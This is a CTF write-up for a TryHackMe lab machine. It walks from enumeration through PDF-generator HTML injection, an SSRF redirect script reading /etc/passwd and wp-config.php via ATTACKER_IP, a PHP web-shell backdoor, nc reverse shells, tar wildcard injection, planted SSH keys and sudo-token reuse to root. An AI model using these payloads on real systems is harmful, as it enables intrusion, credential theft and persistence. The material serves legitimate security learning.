---
title: Sea Surfer
categories: [TryHackMe, WriteUp]
tags: [SeaSurfer, TryHackMe, WriteUp]
---

# Sea Surfer
<img src="/assets/img/posts/seasurfer/seasurfer.png" width="50%" height="50%">

You can find this CTF [here](https://tryhackme.com/room/seasurfer)

## <span style="color: var(--link-color);">Enumeration</span>
As always, I began with a nmap scan (what is more important than enumeration? beer? &#129488;):
```shell
sudo nmap -sV -sS -sC -O -v -p- 10.10.181.107
[sudo] password for kali: 
Starting Nmap 7.92 ( https://nmap.org ) at 2022-06-20 06:58 EDT
[TRUNCATED]
Nmap scan report for 10.10.181.107
Host is up (0.046s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 87:e3:d4:32:cd:51:d2:96:70:ef:5f:48:22:50:ab:67 (RSA)
|   256 27:d1:37:b0:c5:3c:b5:81:6a:7c:36:8a:2b:63:9a:b9 (ECDSA)
|_  256 7f:13:1b:cf:e6:45:51:b9:09:43:9a:23:2f:50:3c:94 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
| http-methods: 
|_  Supported Methods: OPTIONS HEAD GET POST
|_http-title: Apache2 Ubuntu Default Page: It works
|_http-server-header: Apache/2.4.41 (Ubuntu)

[TRUNCATED]
```

Let's check the port 80:

![Website](/assets/img/posts/seasurfer/website_ip.png)

It's an apache website with the default page. I tried to enumerate the page with gobuster but I didn't find anything useful. So, out of despair, I use **Nikto**.

![Nikto Output](/assets/img/posts/seasurfer/nikto.png)

And I noticed that there was the following output:
```shell
+ Uncommon header 'x-backend-server' found, with contents: seasurfer.thm
```

Yeah, I also could see the header without nikto but I were good to notice that in nikto output &#128578;

So, I added the hostname in **/etc/hosts** file:

![/etc/hosts](/assets/img/posts/seasurfer/etc_hosts.png)

Then, I navigated to the hostname and I found the real website:

![Sea Surfer website](/assets/img/posts/seasurfer/sea_surfer_site.png)

By watching the website, I found a possible username, "kyle":

![Kyle Username](/assets/img/posts/seasurfer/username_kyle.png)

This could be a username, indeed, trying to insert in the login page **wp-login.php** (this page is a standard login page of WordPress websites), I received the following error:

![Wrong Username](/assets/img/posts/seasurfer/wrong_username.png)

Instead, if I used a non-existent user, I received this:

![Notexistent Username](/assets/img/posts/seasurfer/notexist_user.png)

So, I could confirm that kyle is the username of the website. 

Continuing to analyze the website, I found also an article in which there was useful information. Indeed, by watching the **News** articles, there was a user comment that ask (I think to kyle) something about an internal site that didn't work:

![Discover Internal Website](/assets/img/posts/seasurfer/blog_discover_internal.png)

Indeed, in the guy's comment, there was "intrenal.seasurfer.thm" but I thought that the right hostname was **internal**.seasurfer.thm. I added also this hostname to /etc/hosts page:

![/etc/hosts](/assets/img/posts/seasurfer/etc_hosts_internal.png)

> Tips: There is no need to add two rows in /etc/hosts for the same IP, you can add more hostnames for a single IP


I, then, navigated to that website and I retrieved this:

![Internal Website](/assets/img/posts/seasurfer/internal_seasurfer.png)

What a peaceful desktop image!


## <span style="color: var(--link-color);">Foothold</span>

I began to insert some normal input into the website to see what happened:
![Normal Input](/assets/img/posts/seasurfer/test_pdf_dati.png)

And I obtained a pdf file with the input that I inserted:

![Normal Input](/assets/img/posts/seasurfer/test_pdf.png)

![Meme Linpeas](/assets/img/meme/sticker_pdf.png)


So, I started to put some payload to check if I could use it.
I began with some stupid payload like ```<script>alert(1)</script>```.

![Script Input](/assets/img/posts/seasurfer/test_payload.png)

I know that I didn't obtain an alert, since it was a pdf but I would to see what happens. Maybe there was some check to the word? Maybe the string was inserted as I wrote? I don't know, let's check. The result was the following:

![Script Input](/assets/img/posts/seasurfer/test_payload_pdf.png)

Wow! So maybe I can use this to execute a command. I began to search online for something about "execution command pdf" and I found this [article](https://medium.com/r3d-buck3t/xss-to-exfiltrate-data-from-pdfs-f5bbb35eaba7).

By using the payload of the previous link I confirmed the vulnerability, by using the following payload:
```html
<img src="x" onerror="document.write('test')" />
```

I obtained the "test" text on the pdf file:
![Test payload](/assets/img/posts/seasurfer/test_document_write_pdf.png)

It works! I tried to get some payload in the link and I tried this:
```html
<iframe src="file:///etc/passwd"> 
```
But I obtained an empty iframe &#128532;

![C'mon execute payload](/assets/img/meme/execute_payload.png)

Since in the link was an important note that said that if the schema of the webpage is different from **ftp://** the payload ```file:///etc/passwd``` didn't work.
So, I checked the schema with this payload:

```html
<script>document.write(document.location.href)</script>
```

And, bad news guys, I discovered that was **http://**.

![Schema payload](/assets/img/posts/seasurfer/schema_pdf.png)

I also used the following payload to retrieve the software/version used:

```html
<img src=x onerror=document.write(navigator.appVersion)>
```

And I obtained this:
![Software payload](/assets/img/posts/seasurfer/name_software.png)

So I discovered that it used **wkhtmltopdf** to generate the pdf but I didn't have the version. Searching this software I found many resources that talk about SSRF.

I found some interesting [link](https://www.jomar.fr/posts/2021/ssrf_through_pdf_generation/) in which they use a PHP script to redirect the request and obtain the requested file. So, I used the following code:

```php
<?php

$loc = "http://127.0.0.1/";

if(isset($_GET['a'])){
    $loc = $_GET['a'];
}
header('Location: '.$loc);

?>
```

I started a PHP server (the error that I done before was that I used a python server and the PHP script didn't execute the payload):

```bash
php -S 0.0.0.0:80
```

And, then, I used the following payload to call the PHP script:

```html
<iframe height=2000 width=50 src="http://ATTACKER_IP/ssrf.php?a=file:///etc/passwd">
```

And I obtained the **/etc/passwd** file:
![Passwd](/assets/img/posts/seasurfer/passwd.png)


So, I tried with different files but a common file on the WordPress website is **wp-config**, but I didn't know the entire path in the server. So I tried many path such as **/var/www/seasurfer**, then I tried the common path **/var/www/wordpress** and it worked:

```html
<iframe height=2000 width=1000 src="http://ATTACKER_IP/ssrf.php?a=file:///var/www/wordpress/wp-config.php">
```

![Wp-config](/assets/img/posts/seasurfer/wp-config.png)

In the file there was the following (I'm sorry, censored) information:
```
// ** Database settings - You can get this info from your web host ** //
/** The name of the database for WordPress */
define( 'DB_NAME', 'CENSORED' );
/** Database username */
define( 'DB_USER', 'CENSORED' );
/** Database password */
define( 'DB_PASSWORD', 'CENSORED' );
```

I had some credentials but I didn't know where to use them. I thought that I miss something, so, I started again an enumeration with gobuster but this time with a bigger wordlist and I found an interesting path:
![Big Gobuster](/assets/img/posts/seasurfer/gobuster_big.png)

I navigated to that link and I found a login page for a database (Yeah! I can use here the found credentials):

![Adminer](/assets/img/posts/seasurfer/adminer_db.png)

I go to the **db_user** table to see if there is some useful credentials and I got a hashed password from kyle:

![Kyle Credentials DB](/assets/img/posts/seasurfer/db_user.png)

I check what type of hash is:

![Hashid](/assets/img/posts/seasurfer/hashid.png)

And I cracked that hashed password by using hashcat:
```bash
hashcat -m 400 'HASH' ~/Documents/rockyou.txt

(HASH):(PASSWORD DECRYPTED)
```

## <span style="color: var(--link-color);">www-data Access</span>

By using that password I could login into the website with kyle user:
![Login Wordpress](/assets/img/posts/seasurfer/login_wordpress.png)

There are several ways to abuse WordPress. I tried to upload a web shell by using the Plugin page:

![Plugin](/assets/img/posts/seasurfer/plugin.png)

So, I clicked on "Add new":

![Upload Plugin](/assets/img/posts/seasurfer/upload_plugin.png)

And I clicked on "Upload Plugin":

![Browse Plugin](/assets/img/posts/seasurfer/browse_plugin.png)

And I uploaded the following PHP code:

```php
<!-- Simple PHP backdoor by DK (http://michaeldaw.org) -->

<?php

if(isset($_REQUEST['cmd'])){
        echo "<pre>";
        $cmd = ($_REQUEST['cmd']);
        system($cmd);
        echo "</pre>";
        die;
}

?>

Usage: http://target.com/simple-backdoor.php?cmd=cat+/etc/passwd

<!--    http://michaeldaw.org   2006    -->
```

This upload gave me an error:

![Error Plugin](/assets/img/posts/seasurfer/error_upload_plugin.png)

But the file was uploaded anyway, indeed, by navigating the "Media" page, I saw my **shell.php**:

![Media](/assets/img/posts/seasurfer/media_wordpress.png)

But, it was needed the path of that file to use it and I retrieved that by looking at the media information (by clicking on the icon of shell.php):

![Shell.php information](/assets/img/posts/seasurfer/path_media_shell.png)


I tested that the script worked by navigating the URL in the info page:

![Shell.php](/assets/img/posts/seasurfer/shell_onWeb.png)

So, I could execute the command by using the webshell that I uploaded. So I created a reverse shell with the following encoded command:

```
rm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7C%2Fbin%2Fbash%20-i%202%3E%261%7Cnc%20ATTACKER_IP%208080%20%3E%2Ftmp%2Ff
```

> Change the "ATTACKER_IP" with your IP

That decoded was:

```bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc ATTACKER_IP 8080 >/tmp/f
```

So, I started a netcat listener ```nc -lnvp 8080``` and I navigated this URL with my payload

```
http://seasurfer.thm/wp-content/uploads/2022/06/shell.php?cmd=rm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7C%2Fbin%2Fbash%20-i%202%3E%261%7Cnc%20ATTACKER_IP%208080%20%3E%2Ftmp%2Ff
```

I got the access as **www-data**:
![www-data access](/assets/img/posts/seasurfer/reverse_shell_www-data.png)



## <span style="color: var(--link-color);">Kyle Access</span>

In order to get the access as Kyle, I began to see if I could find some interesting files and I got a file called **backup.sh** in **/var/www/internal/maintenance**:

```
www-data@seasurfer:/var/www/internal/maintenance$ cat backup.sh
cat backup.sh
#!/bin/bash

# Brandon complained about losing _one_ receipt when we had 5 minutes of downtime, set this to run every minute now >:D
# Still need to come up with a better backup system, perhaps a cloud provider?

cd /var/www/internal/invoices
tar -zcf /home/kyle/backups/invoices.tgz *
```

So, this file is executed every minute, and I could use it to access kyle since the wildcard * of tar command has a known [exploit](https://www.hackingarticles.in/exploiting-wildcard-for-privilege-escalation/).

Indeed I ran the following command to create a reverse shell as kyle: 

The script enter in the path **/var/www/internal/invoices**:
```bash
cd /var/www/internal/invoices
```

Then the following command to create a shell.sh containing the payload to create a reverse shell:
```bash
echo "mkfifo /tmp/lhennp; nc ATTACKER_IP 1234 0</tmp/lhennp | /bin/sh >/tmp/lhennp 2>&1; rm /tmp/lhennp" > shell.sh
```

The **--checkpoint-action** option specify the program which will be executed. 
the **--checkpoint-action=ACTION** option execute ACTION on each checkpoint

```bash
echo "" > "--checkpoint-action=exec=sh shell.sh"
echo "" > --checkpoint=1
```

I start a netcat listener and I got a reverse shell as kyle:

![www-data access](/assets/img/posts/seasurfer/reverse_shell_kyle.png)

To have a stable shell, I create a key with ssh-keygen and then I copied the public key on the authorized_keys file of kyle (in ```/home/kyle/.ssh```)

```bash
echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCzLsZsSias0FgDPCbdZBMlsSbc0+g/ttUgFAhgmTHI1c2RODCAcNTNTAyG903SWHcyKSjRg5RdzHtTZn5iP7Y8D4SUIEPmz2zzjkk3X2Z53OZNXhS1jnBTF7H9x7KHzoiO4bRJTfRY11jijvCWdSiQHOwS36utR+F6Qt7d4qhBbwZuhoQC53CDQToQ+LdjoXxVjceFwt4VmhatcpY8ZKL3iD9jh5uFVlbg5m5qET2nQbF7xUFveiaS+UGVRnBxzGhK3eAQwSrMYPowtg5+9+sc6yTFYKxzjpJ35EtT+0WlLFomClqavXEn0lfQ4sHQk+5a9WHH4L1sZPxwb2DP8zXE6QrBPnV3ty6asljZeHd1+1n1QyytZhdMs6hzlWuGyXC7bg7hOStxLjganD7dosqbGnqI2BGodwY2pegdsiTSNPnRNtptaMTOJr/jb/zL78yg21XtIWyMpzQrE+97KwIMAhh7ipnurwwsZjuoxi4GUkAYj7G5RBhrsldGLX4cttk= kali@kali
" >> authorized_keys
```

Then I gave permission to the private key and I used it to login as kyle:

```bash
chmod 600 id_rsa_kyle
kali@kali:~/Documents/TryHackMe/SeaSurfer$ ssh -i id_rsa_kyle kyle@10.10.46.100
```


## <span style="color: var(--link-color);">Privilege Escalation</span>

The Privilege Escalation was the sudo token reuse. Indeed by watching the output of LinPEAS I could note the following output:

![Linpeas Output](/assets/img/posts/seasurfer/linpeas_sudo_token.png)

I read the attack on [HackTricks](https://book.hacktricks.xyz/linux-hardening/privilege-escalation#reusing-sudo-tokens) and it writes "In the scenario where you have a shell as a user with sudo privileges but you don't know the password of the user, you can wait for him to execute some command using sudo". This is the scenario that I had because I had user kyle but I didn't have his password.

For this attack I needed **gdb** so I downloaded the .deb file from [here](https://packages.ubuntu.com/focal/amd64/gdb/download) and then I installed on the machine with the following command:

```bash
dpkg -x gdb_9.1-0ubuntu1_amd64.deb ~
```

I used this command because I didn't have the possibility to use sudo, so in this way, I could install package without sudo privilege. So, this command installed the .deb file in **/home/kyle**. Indeed, in the kyle's home I had the **usr** folder:

![Home Kyle](/assets/img/posts/seasurfer/home_kyle.png)

Gdb was in that folder (exactly in /home/kyle/usr/bin/gdb). 

> Tips: If you want to install in some other folder, you need to change the path in the command but you need to have the writing permission, for this, I choose kyle's home: dpkg -x gdb_9.1-0ubuntu1_amd64.deb PATH_IN_WHICH_YOU_WHAT_INSTALL

After the gdb installation, I needed the exploit that HackTricks cited and you can find [here](https://github.com/nongiach/sudo_inject). So, I downloaded the git project and I uploaded the **exploit.sh**. I executed it:

![Exploit.sh](/assets/img/posts/seasurfer/exploit_sh_sudo_token.png)

And then I checked if it worked and I got root access:

![Root Access](/assets/img/posts/seasurfer/root_access.png)


I suggest reading also this [Writeup](https://github.com/lassidev/writeups/blob/main/TryHackMe/Sea%20Surfer.md) in which the attacks are explained very very well!